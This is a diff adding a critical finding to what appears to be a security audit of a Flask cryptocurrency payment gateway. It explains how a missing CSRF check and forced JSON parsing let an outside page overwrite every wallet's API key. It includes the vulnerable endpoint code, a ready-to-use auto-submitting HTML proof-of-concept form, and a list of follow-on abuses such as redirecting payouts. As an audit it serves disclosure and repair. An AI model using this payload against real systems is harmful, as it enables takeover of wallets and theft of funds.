@@ -5,6 +5,54 @@
 
 ---
 
+## CRITICAL — CSRF → API Key Overwrite → Full Outsider Compromise
+
+**Files:** `api_v1.py:217-224`, `auth.py:71-86`
+
+**The Chain (zero credentials, pure outsider):**
+
+1. `POST /<crypto>/payment-gateway/token` uses `@login_required` (session cookie) — NOT `@api_key_required`
+2. Uses `request.get_json(force=True)` — parses JSON regardless of Content-Type header
+3. Zero CSRF protection anywhere in the app (no Flask-WTF, no csrf_token in any form)
+4. Sets API key for ALL wallets at once:
+
+```python
+# api_v1.py:217-224
+@bp.post("/<crypto_name>/payment-gateway/token")
+@login_required
+def payment_gateway_set_token(crypto_name):
+    req = request.get_json(force=True)      # parses text/plain as JSON
+    for crypto in Crypto.instances.values():
+        crypto.wallet.apikey = req["token"]  # ALL wallets overwritten
+    db.session.commit()
+```
+
+**Attack:**
+
+Outsider hosts this HTML. Admin visits while logged in:
+
+```html
+<form method="POST" enctype="text/plain"
+  action="https://target/api/v1/BTC/payment-gateway/token">
+  <input name='{"token":"ATTACKER_KEY","x":"' value='"}'>
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+Browser sends: `{"token":"ATTACKER_KEY","x":"="}` with admin's session cookie.
+`get_json(force=True)` parses it. ALL wallet API keys become `ATTACKER_KEY`.
+
+**Post-exploitation** (attacker now has the API key):
+- SSRF via payout path traversal (finding below)
+- Trigger payouts to attacker addresses
+- Create invoices with internal callback_url
+- Read all wallet/invoice/transaction data
+- All @api_key_required endpoints now accessible
+
+**SameSite note:** Flask 2.2.2 may default session cookie to `SameSite=Lax`, which blocks cross-site POST cookies in modern browsers. However: (1) this is browser-side mitigation, not server-side fix, (2) any XSS on the same origin bypasses it, (3) the server has literally zero CSRF protection.
+
+---
+
 ## CRITICAL — SSRF via Payout Destination Path Traversal
 
 **Affects:** ALL non-BTC-like crypto backends (ETH, TRX, SOL, XRP, BNB, MATIC, AVAX, ARB, OP, LTC)
